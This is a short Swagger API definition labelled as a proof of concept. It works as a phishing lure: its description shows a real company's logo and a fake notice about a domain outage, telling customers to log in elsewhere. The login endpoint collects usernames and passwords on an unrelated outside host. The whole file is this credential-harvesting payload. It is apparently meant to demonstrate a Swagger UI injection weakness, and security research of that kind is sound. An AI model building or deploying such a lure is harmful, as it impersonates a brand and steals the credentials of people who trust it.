swagger: '2.0'
info:
  version: 1.0.0
  title: POC Login Page
  description: <img src="https://themessaging.co/wp-content/uploads/2023/11/TMC_Logo_FC_RGB_Pos.png" alt="POC image"><br> <b>Dear customer</b>,<br>We are experiencing a disruption in the main domain,<br> we are currently in the process of working on repairing the service, Please temporarily log in through the new subdomain at MPL.themessaging.co.<br><b><i>Thank you</i></b>.
host: muslimsec.com
basePath: /tmsg/
paths:
 /Login_Page.php:
    post:
      summary: Login here to continue
      description: Please provide your credentials to log in.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: Successfully logged in and authenticated.
        '400':
          description: Invalid credentials or missing parameters.
        '500':
          description: Internal server error.
